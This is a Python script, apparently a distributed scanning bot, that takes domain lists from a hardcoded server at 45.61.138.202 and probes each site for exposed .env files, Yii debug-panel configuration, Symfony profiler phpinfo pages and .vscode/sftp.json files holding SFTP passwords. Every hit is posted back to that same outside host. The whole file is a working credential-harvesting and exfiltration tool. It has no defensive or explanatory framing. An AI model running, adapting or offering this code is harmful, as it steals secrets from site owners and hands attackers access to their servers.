import requests
import threading
import time
import re

def perform_http_request(url, timeout=20, ignore_ssl_errors=True):
    try:
        response = requests.get(url, timeout=timeout, verify=not ignore_ssl_errors)
        return response
    except requests.RequestException:
        return None

def getRequestData(processed_pocket=-1, time=-1):
    url = 'http://45.61.138.202/getList.php'
    data = {'ver': 8, 'processed_pocket': processed_pocket, 'time': time}
    while True:
        try:
            response = requests.post(url, json=data)
            if response.status_code == 200 and 'status' in response.json() and response.json()['status'] == 1:
                return response.json()
        except Exception as e:
            print("Error:", e)
        time.sleep(60)
def get_symfony_env(html):
    start_idx_2 = html.find("Environment")
    end_idx_2 = html.find("<h1>PHP Credits</h1>")

    if start_idx_2 == -1 or end_idx_2 == -1:
        return "Вторые необходимые подстроки не найдены"

    second_part = html[start_idx_2:end_idx_2]

    # Проверка на наличие <a name="module_core">
    module_core_start = second_part.find('<a name="module_core">')
    environment_header_end = second_part.find('<h2>Environment</h2>')

    # Если подстрока найдена, удаляем часть содержимого
    if module_core_start != -1 and environment_header_end != -1:
        second_part = second_part[environment_header_end:]

    # Очистка HTML и объединение обеих частей
    combined_html = second_part
    combined_html = combined_html.replace("<td class=\"v\">", ": ")
    combined_html = re.sub('<[^<]+?>', '', combined_html)
    return "Symfony" + combined_html

def get_yii_env(html):
    # Извлечение первого куска
    start_idx_1 = html.find("<h3>Application Configuration</h3>")
    end_idx_1 = html.find("<h3>Installed Extensions</h3>")
    
    if start_idx_1 == -1 or end_idx_1 == -1:
        return "Первые необходимые подстроки не найдены"

    first_part = html[start_idx_1:end_idx_1]

    # Извлечение второго куска
    start_idx_2 = html.find("<h2>Environment</h2>")
    end_idx_2 = html.find("<h1>PHP Credits</h1>")

    if start_idx_2 == -1 or end_idx_2 == -1:
        return "Вторые необходимые подстроки не найдены"

    second_part = html[start_idx_2:end_idx_2]

    # Очистка HTML и объединение обеих частей
    combined_html = first_part + second_part
    combined_html = combined_html.replace("<td class=\"v\">", ": ")
    combined_html = re.sub('<[^<]+?>', '', combined_html)
    return "Yii " + combined_html
    
def postData(url, text, previous_urls):
    response_data = ''
    if url not in previous_urls:
        http_response = perform_http_request('http://' + url)
        if http_response == None:
            http_response = perform_http_request('https://' + url, ignore_ssl_errors=True)
        if http_response != None:
            headers_text = '\n'.join([f"{key}: {value}" for key, value in response.headers.items()])
            response_data = headers_text + "\n\n" + http_response.text
        previous_urls.add(url)
    data = {'url': url, 'text': text, 'response': response_data}
    post_url = 'http://45.61.138.202/postData.php'
    while True:
        try:
            response = requests.post(post_url, json=data)
            if response.status_code == 200 and 'status' in response.json() and response.json()['status'] == 1:
                return response.json()
        except Exception as e:
            print("Error:", e)
        time.sleep(60)


def process_domain(domain, previous_urls):
    protocols = ['http', 'https']
    max_redirects = 5

    for protocol in protocols:
        initial_url = f"{protocol}://{domain}/.env"
        response = perform_http_request(initial_url)
        redirects_handled = 0

        while response and redirects_handled <= max_redirects:
            text = response.text.lower()
            headers = {k.lower(): v for k, v in response.headers.items()}

            # Проверка содержимого для особых подстрок
            if 'app_name' in text or 'app_key' in text:
                postData(domain, response.text, previous_urls)

            # Обработка специфических заголовков
            if 'x-debug-link' in headers:
                debug_link = headers['x-debug-link'].split('?')[0] + '?panel=config'
                debug_response = perform_http_request(f"{protocol}://{domain}/{debug_link}")
                if debug_response:
                    processed_text = get_yii_env(debug_response.text)
                    postData(domain, processed_text, previous_urls)

            elif 'x-debug-token' in headers or 'x-debug-token-link' in headers:
                profiler_url = f"{protocol}://{domain}/_profiler/phpinfo"
                profiler_response = perform_http_request(profiler_url)
                if profiler_response:
                    processed_text = get_symfony_env(profiler_response.text)
                    postData(domain, processed_text, previous_urls)

            # Проверка и обработка редиректов
            if response.history:
                redirected_url = response.history[-1].headers['Location']
                response = perform_http_request(redirected_url)
                redirects_handled += 1
            else:
                break

        # Проверка файла .vscode/sftp.json
        sftp_url = f"{protocol}://{domain}/.vscode/sftp.json"
        sftp_response = perform_http_request(sftp_url)
        if sftp_response and all(key in sftp_response.text.lower() for key in ['password', 'host', 'username', 'port']) and 'adminer.org' not in sftp_response.text.lower():
            postData(domain, sftp_response.text, previous_urls)
            
            
def main():
    previous_urls = set()

    data = getRequestData()
    domain_list_url = f"http://45.61.138.202/lists/{data['id']}.txt"
    response = perform_http_request(domain_list_url)
    if response and response.status_code == 200:
        domains = response.text.splitlines()
        threads = []
        start_time = time.time()
        for domain in domains:
            thread = threading.Thread(target=process_domain, args=(domain, previous_urls))
            threads.append(thread)
            thread.start()
            if len(threads) >= data['threads']:
                for t in threads:
                    t.join()
                threads = []
    else:
        print("Error fetching domain list")

    duration = time.time() - start_time
    getRequestData(processed_pocket=data['id'], time=duration)

if __name__ == "__main__":
    main()
